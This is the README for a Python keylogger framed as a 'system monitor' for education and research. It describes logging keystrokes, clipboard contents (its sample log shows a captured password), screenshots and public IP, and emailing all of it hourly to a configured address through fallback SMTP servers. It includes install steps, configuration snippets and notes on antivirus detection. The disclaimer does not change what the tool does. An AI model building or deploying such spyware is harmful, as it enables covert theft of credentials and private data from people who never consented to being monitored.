# Python System Monitor

A comprehensive system monitoring tool for security research and educational purposes.

## 🚨 **IMPORTANT LEGAL DISCLAIMER**

**This software is strictly for educational purposes, authorized security research, and legitimate system monitoring only.**

- ✅ **Authorized Use**: Only on systems you own or have explicit written permission to monitor
- ✅ **Educational**: Learning about system monitoring and security concepts
- ✅ **Research**: Authorized cybersecurity research in controlled environments
- ❌ **Prohibited**: Any unauthorized, malicious, or illegal use

**Users are fully responsible for ensuring legal compliance in their jurisdiction.**

---

## 📋 Overview

This system monitoring tool provides comprehensive insight into system activity including:

- **Keystroke Logging**: Detailed keystroke capture with timestamps
- **System Information**: Hardware, network, and user details  
- **Screenshot Capture**: Periodic visual documentation
- **Clipboard Monitoring**: Track clipboard contents over time
- **Automated Reporting**: Hourly email reports with all collected data
- **Emergency Shutdown**: Immediate termination via ESC key

## 🛠️ Features

### Core Monitoring Capabilities
- **Real-time Keystroke Logging** with microsecond timestamps
- **System Information Collection** (IP, hostname, platform details)
- **Screenshot Capture** using PIL/ImageGrab
- **Clipboard Content Tracking** via win32clipboard
- **Session Duration Tracking** from start to finish

### Advanced Features
- **Hourly Automated Reports** via email with all attachments
- **Emergency Shutdown** (ESC key) with immediate data transmission
- **Multiple Email Providers** (Gmail, Outlook, Yahoo) with fallback
- **Local Backup System** with timestamped file storage
- **Thread-safe Operations** with proper cleanup handling
- **Graceful Error Handling** continues operation despite component failures

### Security Features
- **Modifier Key Detection** (Ctrl, Shift, Alt combinations)
- **Control Character Recognition** (Ctrl+C, Ctrl+V, etc.)
- **Session Continuity** maintains operation through system events
- **Data Integrity** ensures all keystrokes are captured and stored

## 📦 Installation

### Prerequisites
```bash
# Core dependencies
pip install pynput pillow requests

# Windows-specific (for clipboard monitoring)
pip install pywin32

# Optional enhancements
pip install scipy sounddevice cryptography
```

### Setup
1. **Configure Email Settings**:
   ```python
   email_address = "your-email@gmail.com"
   email_password = "your-app-password"  # Use App Password for Gmail
   toaddr = "recipient@email.com"
   ```

2. **Set File Path**:
   ```python
   file_path = "C:\\Your\\Monitoring\\Path"
   ```

3. **Gmail App Password Setup** (if using Gmail):
   - Enable 2-Factor Authentication
   - Generate App Password in Google Account settings
   - Use App Password instead of regular password

## 🚀 Usage

### Basic Operation
```bash
python keylogger.py
```

### Controls
- **Normal Operation**: Runs continuously with hourly reports
- **Emergency Shutdown**: Press `ESC` key for immediate termination
- **Graceful Exit**: Ctrl+C or normal program termination

### Output Files
- **`key_log.txt`**: Timestamped keystroke log
- **`system_info.txt`**: System and network information
- **`clipboard_info.txt`**: Clipboard content history
- **`screenshot_info.png`**: Latest screenshot capture
- **`backups/`**: Timestamped backup copies of all files

## 📧 Email Reporting

### Automated Hourly Reports
- **Subject**: "Hourly Report - Session 2h 30m Active"
- **Content**: Session duration, timestamps, file attachments
- **Attachments**: All 4 monitoring files with hour-specific naming

### Emergency Reports
- **Subject**: "EMERGENCY - Complete System Report"
- **Content**: Final session summary with total duration
- **Attachments**: Final versions of all monitoring files

### Email Configuration
```python
# Multiple SMTP server support with automatic fallback
smtp_servers = [
    ('smtp.gmail.com', 587),      # Primary
    ('smtp.outlook.com', 587),    # Fallback 1
    ('smtp.mail.yahoo.com', 587)  # Fallback 2
]
```

## 🔧 Configuration Options

### Monitoring Intervals
```python
# Keystroke buffer size (triggers file write)
count >= 10  # Write every 10 keystrokes

# Hourly report interval
_hourly_timer = threading.Timer(3600.0, send_hourly_report)
```

### File Management
```python
# Log file names
keys_information = "key_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard_info.txt"
screenshot_information = "screenshot_info.png"
```

## 📊 Log Format Examples

### Keystroke Log
```
[2025-06-30 14:23:15.123] h
[2025-06-30 14:23:15.234] e
[2025-06-30 14:23:15.345] l
[2025-06-30 14:23:15.456] l
[2025-06-30 14:23:15.567] o
[2025-06-30 14:23:15.678] [SPACEBAR]
[2025-06-30 14:23:15.789] [CTRL+C]
```

### System Information
```
Processor: Intel64 Family 6 Model 142
System: Windows
Release: 10
Hostname: DESKTOP-ABC123
IP Address: 192.168.1.100
Public IP: 203.0.113.1
User: Administrator
Session duration: 2:30:45
```

### Clipboard Log
```
[2025-06-30 14:23:20] Clipboard: Hello World
[2025-06-30 14:25:10] Clipboard: https://example.com
[2025-06-30 14:27:30] Clipboard: password123
```

## 🛡️ Error Handling

### Graceful Degradation
- **Missing Libraries**: Continues operation with available features
- **Network Issues**: Saves backup copies locally
- **Email Failures**: Attempts multiple SMTP servers
- **File Errors**: Creates error logs and continues monitoring

### Backup Systems
- **Local File Backups**: Timestamped copies in `backups/` folder
- **Email Backup Logs**: Records failed email attempts
- **Error Logging**: Detailed error tracking for troubleshooting

## ⚠️ Important Notes

### Legal Compliance
- Ensure proper authorization before deployment
- Review local privacy and monitoring laws
- Implement proper data protection measures
- Document legitimate use cases

### Security Considerations
- **Email Security**: Use App Passwords, not account passwords
- **Data Protection**: Secure storage of monitoring files
- **Network Security**: Monitor for unauthorized access
- **Access Control**: Restrict file and email access

### Technical Limitations
- **Windows Focus**: Optimized for Windows environments
- **Email Dependencies**: Requires SMTP access for reporting
- **Resource Usage**: Continuous monitoring uses system resources
- **Detection**: May be flagged by security software

## 🔍 Troubleshooting

### Common Issues
1. **Email Not Sending**:
   - Verify App Password setup
   - Check SMTP server settings
   - Review firewall configurations

2. **Missing Screenshots**:
   - Install PIL: `pip install pillow`
   - Check display permissions

3. **Clipboard Not Working**:
   - Install: `pip install pywin32`
   - Run as Administrator if needed

4. **File Permission Errors**:
   - Check write permissions
   - Run as Administrator
   - Verify file path exists

### Debug Mode
Enable additional logging by modifying print statements or adding:
```python
import logging
logging.basicConfig(level=logging.DEBUG)
```

## 📂 Project Structure

```
keylogger/
├── keylogger.py              # Main monitoring script
├── key_log.txt              # Keystroke logs (generated)
├── system_info.txt          # System information (generated)
├── clipboard_info.txt       # Clipboard history (generated)
├── screenshot_info.png      # Latest screenshot (generated)
├── backups/                 # Timestamped backups (generated)
│   ├── keylog_backup_*.txt
│   ├── system_backup_*.txt
│   ├── clipboard_backup_*.txt
│   └── screenshot_backup_*.png
└── README.md               # This documentation
```

## 🚀 Quick Start

1. **Install dependencies**:
   ```bash
   pip install pynput pillow requests pywin32
   ```

2. **Configure email settings** in the script

3. **Run the monitor**:
   ```bash
   python keylogger.py
   ```

4. **Monitor console output** for status updates

5. **Press ESC** for emergency shutdown

## 📝 Version History

- **v1.0**: Basic keystroke logging
- **v2.0**: Added system info and clipboard monitoring  
- **v3.0**: Implemented email reporting
- **v4.0**: Added hourly automated reports
- **v5.0**: Enhanced emergency shutdown and backup systems

---

**Remember**: This tool is for authorized monitoring only. Always ensure proper legal compliance and ethical use.
